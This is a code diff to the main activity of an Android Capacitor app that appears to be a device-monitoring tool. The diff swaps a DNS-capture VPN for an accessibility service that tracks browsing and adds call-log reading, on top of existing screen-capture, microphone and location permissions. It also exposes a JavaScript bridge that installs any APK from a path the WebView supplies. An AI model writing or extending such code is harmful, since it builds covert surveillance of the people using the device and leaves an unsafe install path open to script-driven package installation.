@@ -5,7 +5,6 @@ import android.content.Context;
 import android.content.Intent;
 import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
-import android.net.VpnService;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
@@ -15,17 +14,18 @@ import android.webkit.JavascriptInterface;
 import android.webkit.WebView;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
+import androidx.core.content.FileProvider;
 import androidx.work.ExistingPeriodicWorkPolicy;
 import androidx.work.PeriodicWorkRequest;
 import androidx.work.WorkManager;
 import com.getcapacitor.BridgeActivity;
+import java.io.File;
 import java.util.concurrent.TimeUnit;
 
 public class MainActivity extends BridgeActivity {
 
     private static final int REQ_MEDIA_PROJECTION = 1001;
     private static final int REQ_PERMISSIONS      = 1002;
-    private static final int REQ_VPN_PERMISSION   = 1003;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -44,6 +44,7 @@ public class MainActivity extends BridgeActivity {
             "android.permission.RECORD_AUDIO",
             "android.permission.ACCESS_FINE_LOCATION",
             "android.permission.ACCESS_COARSE_LOCATION",
+            "android.permission.READ_CALL_LOG",
         };
         java.util.List<String> toRequest = new java.util.ArrayList<>();
         for (String p : needed) {
@@ -145,18 +146,24 @@ public class MainActivity extends BridgeActivity {
         }
 
         @JavascriptInterface
-        public boolean isVpnPermissionGranted() {
-            return VpnService.prepare(MainActivity.this) == null;
+        public boolean isAccessibilityServiceEnabled() {
+            String flat = Settings.Secure.getString(getContentResolver(), "enabled_accessibility_services");
+            return flat != null && flat.contains(getPackageName() + "/" + getPackageName() + ".BrowserActivityAccessibilityService");
         }
 
         @JavascriptInterface
-        public void requestVpnPermission() {
-            Intent consent = VpnService.prepare(MainActivity.this);
-            if (consent != null) {
-                startActivityForResult(consent, REQ_VPN_PERMISSION);
-            } else {
-                startDnsMonitor(); // already granted — start right away
-            }
+        public void openAccessibilitySettings() {
+            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
+        }
+
+        @JavascriptInterface
+        public void installApk(String filePath) {
+            File file = new File(filePath);
+            Uri apkUri = FileProvider.getUriForFile(MainActivity.this, getPackageName() + ".fileprovider", file);
+            Intent intent = new Intent(Intent.ACTION_VIEW);
+            intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
+            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
         }
 
         @JavascriptInterface
@@ -188,15 +195,7 @@ public class MainActivity extends BridgeActivity {
             } else {
                 startService(svc);
             }
-        } else if (requestCode == REQ_VPN_PERMISSION && resultCode == Activity.RESULT_OK) {
-            startDnsMonitor();
         }
-    }
-
-    // ── DNS-monitor VPN (browsing activity capture) ────────────────────────────
-    private void startDnsMonitor() {
-        Intent svc = new Intent(this, DnsMonitorVpnService.class);
-        startService(svc);
     }
 
     // ── Permissions & service startup ─────────────────────────────────────────
